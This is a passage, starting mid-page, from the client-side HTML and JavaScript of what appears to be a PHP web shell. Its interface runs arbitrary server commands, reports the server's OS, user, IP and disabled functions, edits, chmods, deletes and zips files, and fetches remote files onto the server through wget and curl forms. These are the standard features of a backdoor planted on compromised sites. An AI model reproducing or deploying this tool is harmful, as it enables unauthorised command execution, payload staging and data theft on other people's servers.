            </div>
        </form>
    </div>
</div>

<script>
    let currentPath = '';
    let uploadQueue = [];

    function showToast(message, status = 'ok') {
        const toast = document.createElement('div');
        toast.className = `toast-notification ${status === 'ok' ? 'success' : 'error'}`;
        toast.textContent = message;
        document.body.appendChild(toast);
        setTimeout(() => { toast.classList.add('show'); }, 10);
        setTimeout(() => {
            toast.classList.remove('show');
            setTimeout(() => { document.body.removeChild(toast); }, 500);
        }, 3000);
    }
    
    async function loadServerInfo() {
        try {
            const response = await fetch(`?ajax=true&action=get_server_info`); 
            const data = await response.json();
            if(data.status === 'ok') {
                const content = `OS        : ${data.os}\nPHP       : ${data.php_version}\nUser      : ${data.user}\nServer IP : ${data.server_ip}\nDisk      : ${data.free_space} / ${data.total_space}\nDisabled  : ${data.disabled_functions}`.trim();
                document.getElementById('server-info').innerHTML = `<pre>${content}</pre>`;
            }
        } catch(e) { document.getElementById('server-info').textContent = 'Failed to load server info.'; }
    }

    // --- UPLOAD LOGIC ---
    function initUploadZone() {
        const uploadZone = document.getElementById('upload-zone');
        const fileInput = document.getElementById('file-input');
        uploadZone.addEventListener('click', () => fileInput.click());
        fileInput.addEventListener('change', handleFileSelect);
        uploadZone.addEventListener('dragover', (e) => { e.preventDefault(); uploadZone.classList.add('drag-over'); });
        uploadZone.addEventListener('dragleave', (e) => { e.preventDefault(); uploadZone.classList.remove('drag-over'); });
        uploadZone.addEventListener('drop', (e) => { e.preventDefault(); uploadZone.classList.remove('drag-over'); handleFileDrop(e); });
        document.getElementById('upload-btn').addEventListener('click', uploadAllFiles);
    }
    function handleFileSelect(e) { const files = Array.from(e.target.files); addFilesToQueue(files); e.target.value = null; }
    function handleFileDrop(e) { const files = Array.from(e.dataTransfer.files); addFilesToQueue(files); }
    function addFilesToQueue(files) {
        files.forEach(file => {
            uploadQueue.push({ file: file, status: 'pending', progress: 0 });
        });
        updateUploadUI();
    }
    function updateUploadUI() {
        const progressContainer = document.getElementById('upload-progress');
        const statsElement = document.getElementById('upload-stats');
        const fileListElement = document.getElementById('upload-file-list');
        if (uploadQueue.length > 0) {
            progressContainer.style.display = 'block';
            const pendingFiles = uploadQueue.filter(f => f.status === 'pending');
            const successFiles = uploadQueue.filter(f => f.status === 'success');
            const errorFiles = uploadQueue.filter(f => f.status === 'error');
            statsElement.innerHTML = `<span class="upload-success">✓ ${successFiles.length}</span> | <span class="upload-error">✗ ${errorFiles.length}</span> | <span>${pendingFiles.length} pending</span>`;
            const overallProgress = (uploadQueue.length > 0) ? Math.round((successFiles.length + errorFiles.length) / uploadQueue.length * 100) : 0;
            document.getElementById('overall-progress').style.width = overallProgress + '%';
            
            fileListElement.innerHTML = uploadQueue.map((item, index) => `<div class="file-list-item"><div class="file-name">${item.file.name}</div><div style="font-size:0.8em;">${item.status === 'success' ? '✓' : item.status === 'error' ? '✗' : '...'}</div></div>`).join('');
        } else {
            progressContainer.style.display = 'none';
            statsElement.textContent = 'Ready to upload...';
            fileListElement.innerHTML = '';
        }
    }
    async function uploadAllFiles() {
        if (uploadQueue.length === 0) { showToast('No files to upload!', 'error'); return; }
        const pendingItems = uploadQueue.filter(item => item.status === 'pending');
        if (pendingItems.length === 0) { showToast('No new files to upload!', 'error'); return; }
        const totalFiles = pendingItems.length;
        let completed = 0;
        for (let i = 0; i < pendingItems.length; i++) {
            const item = pendingItems[i];
            await uploadSingleFile(item, i);
            completed++;
        }
        if (completed === totalFiles) {
            const successCount = uploadQueue.filter(f => f.status === 'success').length;
            const totalCount = uploadQueue.length;
            showToast(`Upload completed: ${successCount}/${totalCount} files`, 'ok');
            loadContent(currentPath);
            uploadQueue = [];
            updateUploadUI();
        }
    }
    async function uploadSingleFile(item, index) {
        const formData = new FormData();
        formData.append('files[]', item.file);
        try {
            const response = await fetch(`?ajax=true&action=upload_multiple&d=${encodeURIComponent(currentPath)}`, {
                method: 'POST', body: formData
            });
            const result = await response.json();
            if (result.status === 'ok' && result.results[0] && result.results[0].status === 'ok') {
                item.status = 'success';
                item.progress = 100;
            } else { item.status = 'error'; }
        } catch (error) { console.error('Upload failed:', error); item.status = 'error'; }
        updateUploadUI();
    }

    // --- EVENT LISTENERS & INITIALIZATION ---
    document.addEventListener('DOMContentLoaded', () => {
        loadContent('<?php echo addslashes(get_path()); ?>');
        loadServerInfo();
        initUploadZone();
        
        document.getElementById('editor-form').addEventListener('submit', handleSave);
        document.getElementById('cmd-form').addEventListener('submit', handleCmd);
        document.querySelector('.container').addEventListener('click', handleActions);

        document.getElementById('create-file-btn').addEventListener('click', () => {
            const name = prompt('Enter new file name:');
            if (name) doAction('create', {type: 'file', name: name});
        });
        document.getElementById('create-dir-btn').addEventListener('click', () => {
            const name = prompt('Enter new folder name:');
            if (name) doAction('create', {type: 'dir', name: name});
        });
        document.getElementById('refresh-btn').addEventListener('click', () => {
            loadContent(currentPath);
            loadServerInfo();
            showToast('Refreshed!', 'ok');
        });

        document.getElementById('wget-form').addEventListener('submit', (e) => {
            e.preventDefault();
            const url = document.getElementById('wget-url').value;
            const filename = document.getElementById('wget-filename').value;
            doAction('upload_wget', { url: url, filename: filename });
            e.target.reset();
        });
        document.getElementById('curl-form').addEventListener('submit', (e) => {
            e.preventDefault();
            const url = document.getElementById('curl-url').value;
            const filename = document.getElementById('curl-filename').value;
            doAction('upload_curl', { url: url, filename: filename });
            e.target.reset();
        });
        document.getElementById('raw-form').addEventListener('submit', (e) => {
            e.preventDefault();
            const filename = document.getElementById('raw-filename').value;
            const content = document.getElementById('raw-content').value;
            doAction('upload_raw', { filename: filename, content: content });
            e.target.reset();
        });

        const pathBarContainer = document.querySelector('.path-bar-container');
        const pathBar = document.getElementById('path-bar');
        const pathInput = document.getElementById('path-input');
        pathBarContainer.addEventListener('click', (e) => {
            if (e.target === pathBarContainer || e.target === pathBar) {
                pathBar.classList.add('hidden');
                pathInput.classList.remove('hidden');
                pathInput.value = currentPath;
                pathInput.focus();
                pathInput.select();
            }
        });
        pathInput.addEventListener('keyup', (e) => {
            if (e.key === 'Enter') {
                loadContent(pathInput.value);
                pathInput.classList.add('hidden');
                pathBar.classList.remove('hidden');
            }
        });
        pathInput.addEventListener('blur', () => {
            pathInput.classList.add('hidden');
            pathBar.classList.remove('hidden');
        });

        document.getElementById('home-btn').addEventListener('click', () => {
            const root = currentPath.includes('\\') ? currentPath.substring(0, 3) : '/';
            loadContent(root);
        });
        document.getElementById('up-btn').addEventListener('click', () => {
            if (currentPath.match(/^[a-zA-Z]:[\\\/]$/)) return;
            let path = currentPath.replace(/[\\\/]$/, '');
            let separator = path.includes('\\') ? '\\' : '/';
            let parentPath = path.substring(0, path.lastIndexOf(separator));
            if (parentPath === '' && separator === '/') parentPath = '/';
            if (parentPath.match(/^[a-zA-Z]:$/)) parentPath += '\\';
            if (parentPath === '' && !parentPath.includes(':')) parentPath = '/';
            loadContent(parentPath);
        });

        // --- BULK ACTION LOGIC ---
        const selectAllCheckbox = document.getElementById('select-all');
        selectAllCheckbox.addEventListener('change', (e) => {
            document.querySelectorAll('.file-checkbox').forEach(cb => {
                cb.checked = e.target.checked;
            });
             updateBulkActionsButtons();
        });

        document.getElementById('bulk-delete-btn').addEventListener('click', () => {
            const selected = Array.from(document.querySelectorAll('.file-checkbox:checked'))
                                .map(cb => cb.getAttribute('data-path'));
            if (selected.length > 0 && confirm(`Delete ${selected.length} selected items? THIS CANNOT BE UNDONE.`)) {
                doBulkAction('bulk_delete', { targets: JSON.stringify(selected) });
            } else if (selected.length === 0) {
                showToast('No items selected!', 'error');
            }
        });

        document.getElementById('bulk-zip-btn').addEventListener('click', () => {
            const selected = Array.from(document.querySelectorAll('.file-checkbox:checked'))
                                .map(cb => cb.getAttribute('data-path'));
            if (selected.length > 0) {
                const zipName = prompt('Enter name for the ZIP archive:', 'archive_' + new Date().toISOString().slice(0, 10) + '.zip');
                if (zipName) {
                    doBulkAction('bulk_zip', { targets: JSON.stringify(selected), zip_name: zipName });
                }
            } else {
                showToast('No items selected!', 'error');
            }
        });

        document.addEventListener('change', (e) => {
            if (e.target.classList.contains('file-checkbox')) {
                updateBulkActionsButtons();
            }
        });
        function updateBulkActionsButtons() {
            const selectedItems = Array.from(document.querySelectorAll('.file-checkbox:checked'));
            const isDisabled = selectedItems.length === 0;
            document.getElementById('bulk-delete-btn').disabled = isDisabled;
            document.getElementById('bulk-zip-btn').disabled = isDisabled;
        }

    });

    // --- MAIN AJAX ACTION HANDLERS ---
    function handleActions(e) {
        let targetElement = e.target.closest('[data-action]');
        if (targetElement) {
            e.preventDefault();
            const action = targetElement.getAttribute('data-action');
            const target = targetElement.getAttribute('data-target');
            switch(action) {
                case 'nav': loadContent(target); break;
                case 'delete': if(confirm(`Delete ${target}?`)) doAction('delete', {target}); break;
                case 'edit': openEditor(target); break;
                case 'chmod': 
                    const mode = prompt('Enter new octal mode (e.g., 0755):', '0755');
                    if (mode) doAction('chmod', {target, mode});
                    break;
                case 'rename':
                    const newName = prompt('Enter new name:', target.split(/[\\\/]/).pop());
                    if (newName) doAction('rename', {old: target, new: newName});
                    break;
                case 'unzip': // NEW: Handle Unzip
                    if (confirm(`Unzip ${target}?`)) doAction('unzip', {target});
                    break;
            }
        }
    }

    async function doAction(action, data) {
        const formData = new FormData();
        for (const key in data) { formData.append(key, data[key]); }
        try {
            const response = await fetch(`?ajax=true&action=${action}&d=${encodeURIComponent(currentPath)}`, {
                method: 'POST', body: formData
            });
            const result = await response.json();
            showToast(result.message, result.status);
            if (result.status === 'ok') {
                loadContent(currentPath);
                loadServerInfo();
            }
        } catch (error) {
            console.error('Action failed:', error);
            showToast('An error occurred.', 'error');
        }
    }
    
    async function doBulkAction(action, data) {
        const formData = new FormData();
        for (const key in data) { formData.append(key, data[key]); }
        try {
            const response = await fetch(`?ajax=true&action=${action}&d=${encodeURIComponent(currentPath)}`, {
                method: 'POST', body: formData
            });
            const result = await response.json();
            showToast(result.message, result.status);
            if (result.status === 'ok') {
                loadContent(currentPath);
            }
        } catch (error) {
            console.error('Bulk Action failed:', error);
            showToast('An error occurred during bulk action.', 'error');
        }
    }


    async function openEditor(filePath) {
        try {
            const response = await fetch(`?ajax=true&action=get_content&file=${encodeURIComponent(filePath)}`);
            const result = await response.json();
            if (result.status === 'ok') {
                document.getElementById('editor-title').textContent = `Edit: ${filePath.split(/[\\\/]/).pop()}`;
                document.getElementById('editor-content').value = result.content;
                document.getElementById('editor-file-path').value = filePath;
                document.getElementById('editor-modal').style.display = 'flex';
            } else { showToast(result.message, result.status); }
        } catch (error) {
            console.error('Failed to open editor:', error);
            showToast('Could not load file content.', 'error');
        }
    }
    function closeModal() { document.getElementById('editor-modal').style.display = 'none'; }
    async function handleSave(e) {
        e.preventDefault();
        const filePath = document.getElementById('editor-file-path').value;
        const content = document.getElementById('editor-content').value;
        await doAction('save_content', {file: filePath, content});
        closeModal();
    }

    async function handleCmd(e) {
        e.preventDefault();
        const cmdInput = document.getElementById('cmd-input');
        const cmdOutput = document.getElementById('cmd-output');
        const cmd = cmdInput.value;
        if (!cmd) return;
        cmdOutput.style.display = 'block';
        cmdOutput.textContent = 'Executing...';
        const formData = new FormData();
        formData.append('cmd', cmd);
        try {
            const response = await fetch(`?ajax=true&action=cmd&d=${encodeURIComponent(currentPath)}`, {
                method: 'POST', body: formData
            });
            const result = await response.json();
            cmdOutput.textContent = result.output;
            cmdInput.value = '';
        } catch (error) {
            console.error('Command execution failed:', error);
            cmdOutput.textContent = 'Error executing command.';
        }
    }

    function loadContent(path) {
        currentPath = path;
        const folderList = document.getElementById('folder-list');
        const fileList = document.getElementById('file-list');
        document.getElementById('select-all').checked = false; 

        folderList.innerHTML = 'Loading...';
        fileList.innerHTML = '<tr><td colspan="6" style="text-align:center;">Loading...</td></tr>';
        
        fetch(`?ajax=true&action=list&d=${encodeURIComponent(path)}`)
            .then(res => res.json())
            .then(data => {
                if (data.status !== 'ok') {
                    showToast('Failed to load directory.', 'error');
                    return;
                }
                updatePathBar(data.path);
                
                // Folders Listing (Minimalist Text Actions)
                folderList.innerHTML = data.folders.map(f => {
                    const isParent = f.name === '..';
                    return `
                    <tr>
                        <td data-label="" style="width:30px;">
                            ${!isParent ? `<input type="checkbox" class="file-checkbox" data-path="${f.path}">` : ''}
                        </td>
                        <td data-label="Name" colspan="4"><i class="fa-solid fa-folder"></i> <a href="#" data-action="nav" data-target="${f.path}">${f.name}</a></td>
                        <td data-label="Actions" class="actions-menu">
                            ${!isParent ? `
                            <button title="Rename" data-action="rename" data-target="${f.path}">R</button>
                            <button title="Delete" data-action="delete" data-target="${f.path}">X</button>
                            ` : ''}
                        </td>
                    </tr>
                    `;
                }).join('');

                // Files Listing (Minimalist Text Actions + Unzip)
                fileList.innerHTML = data.files.map(f => {
                    const isZip = f.is_zip;
                    const fileIconClass = isZip ? 'fa-solid fa-file-zipper' : 'fa-regular fa-file-lines';
                    
                    return `
                    <tr>
                        <td data-label="" style="width:30px;"><input type="checkbox" class="file-checkbox" data-path="${f.path}"></td>
                        <td data-label="Name"><i class="${fileIconClass}"></i> ${f.name}</td>
                        <td data-label="Size">${f.size}</td>
                        <td data-label="Perms" class="perms ${f.is_writable ? 'writable' : 'not-writable'}">${f.perms}</td>
                        <td data-label="Modified">${f.mtime}</td>
                        <td data-label="Actions" class="actions-menu">
                            <button title="Edit" data-action="edit" data-target="${f.path}">E</button>
                            <button title="Rename" data-action="rename" data-target="${f.path}">R</button>
                            <button title="Chmod" data-action="chmod" data-target="${f.path}">C</button>
                            <a href="?download=${encodeURIComponent(f.path)}" title="Download">D</a>
                            ${isZip ? `<button title="Unzip" data-action="unzip" data-target="${f.path}">U</button>` : ''}
                            <button title="Delete" data-action="delete" data-target="${f.path}">X</button>
                        </td>
                    </tr>
                    `;
                }).join('');
            }).catch(err => {
                console.error("Failed to load content:", err);
                folderList.innerHTML = '<span style="color:var(--error)">Error loading folders.</span>';
                fileList.innerHTML = '<tr><td colspan="6" style="text-align:center;color:var(--error)">Error loading files.</td></tr>';
            });
    }

    function updatePathBar(fullPath) {
        const pathBar = document.getElementById('path-bar');
        pathBar.innerHTML = '';
        const isWindows = fullPath.includes('\\');
        const separator = isWindows ? '\\' : '/';
        const parts = fullPath.split(separator);
        let builtPath = isWindows ? '' : '/';
        
        parts.forEach((part, index) => {
            if (part === '') {
                if(index === 0 && !isWindows) {
                    const rootLink = document.createElement('a');
                    rootLink.href = '#'; rootLink.textContent = '/';
                    rootLink.className = 'path-part';
                    rootLink.setAttribute('data-action', 'nav');
                    rootLink.setAttribute('data-target', '/');
                    pathBar.appendChild(rootLink);
                } return;
            }
            if (isWindows && index === 0) { builtPath = part + separator; } 
            else { builtPath += part + separator; }
            if(pathBar.children.length > 0) {
                 const sep = document.createElement('span');
                 sep.className = 'path-sep'; sep.textContent = '>';
                 pathBar.appendChild(sep);
            }
            const partLink = document.createElement('a');
            partLink.href = '#'; partLink.textContent = part;
            partLink.className = 'path-part';
            partLink.setAttribute('data-action', 'nav');
            partLink.setAttribute('data-target', builtPath);
            pathBar.appendChild(partLink);
        });
    }
</script>
</body>
</html>